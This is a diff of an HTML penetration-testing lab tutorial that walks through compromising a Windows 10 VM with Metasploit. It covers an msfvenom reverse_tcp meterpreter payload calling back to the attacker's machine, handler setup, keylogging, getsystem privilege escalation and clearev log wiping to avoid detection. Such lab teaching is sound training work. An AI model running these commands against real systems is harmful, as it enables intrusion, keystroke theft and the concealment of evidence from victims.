@@ -30,13 +30,13 @@
 <p>- From here, you can explore many different exploits, payloads, stagers, & commands by using the “help” or “search” commands</p>
 <p>- For this lab, we will be using the exploit called “exploit/multi/handler” which can be used for many different exploits in Metasploit</p>
 <p>- Before we use this exploit, we need to get our payload onto the target system that will allow our exploit to be conducted successfully. </p>
-<p>- In the msfconsole, type “msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP of Kali Linux machine> LPORT=4444 -f exe > thisismalicious.exe” and hit enter.(PICTURE HERE)</p>
+<p>- In the msfconsole, type “msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP of Kali Linux Machine) LPORT=4444 -f exe > thisismalicious.exe” and hit enter.(PICTURE HERE)</p>
 <img src=""/>
 <p>- This command creates our payload into an executable file, which we will send over to the Windows 10 VM. </p>
 <p>- In this lab environment, simply copy the file & paste it on the Windows 10 VM since the VM’s firewall/security protections are disabled. In a real penetration test, you most likely will not be able to do this. There are many options you can take, such as social engineering, sending a phishing email, etc.</p>
 <p>- Once the executable is on the Windows 10 VM, go back to the Kali Linux terminal and enter “use exploit/multi/handler”. This will create a session in Metasploit and allow us to configure the exploit before running it.</p>
 <p>- Enter “show options”, in which you will see that the exploit needs an LHOST, which will be the Kali Linux IP. The LHOST is the listener machine that receives communication from the executable file/vulnerable machine. </p>
-<p>Enter “set LHOST <Kali Linux IP>”. Enter “show options" again to see the updated configuration. (PICTURE HERE) </p>
+<p>Enter “set LHOST (Kali Linux IP)”. Enter “show options" again to see the updated configuration. (PICTURE HERE) </p>
 <img src=""/>
 
 <h2>3. Exploiting the Vulnerable Windows 10 VM</h2>
@@ -53,10 +53,11 @@
 <p>- Set the session to whatever the session number is listed, and then enter "run"</p>
 <p>- Once complete, there are multiple exploits that Metasploit found that the victim VM may be vulnerable to. We can use one of these to accomplish tasks that could be beneficial to the penetration test. (PICTURE)</p>
 <img src=""/>
-<p>- If we go back to our session, we can run a variety of commands to get a lot of information from the VM. “Hashdump” can collect all of the password hashes so that we can brute force them offline for example. (PICTURE)</p>
+<p>- If we go back to our session, we can run a variety of commands to get a lot of information from the VM. "Keyscan_start" & "Keyscan_dump" will start a keylogger on the victim VM and dump the input to our shell. (PICTURE)</p>
 <img src=""/>
 <p>- Try “getsystem” in the meterpreter shell. If successful, this will escalate our account’s privileges to the highest access, Authority. This will allow us to execute almost anything we want on the Windows VM. You can check the status of the account with “getuid”. (PICTURE)</p>
 <img src=""/>
+<p>- Note how in my instance, the "getsystem" command was unsuccessful, and my account is still an administrator. This is why we try to use the exploit suggester to see if there are vulnerabilities to escalate our privilege.</p>
 <p>- Feel free to play around with the commands in meterpreter to see what it can accomplish. </p>
 <p>- Once you have accomplished your tasks in the penetration test, you can even remove the logs of what you have done in Event Viewer to avoid detection. In the meterpreter shell, enter "clearev". You should see in Event Viewer that the logs are not appearing for what actions you have performed within the VM. (PICTURE) </p>
 <img src=""/>
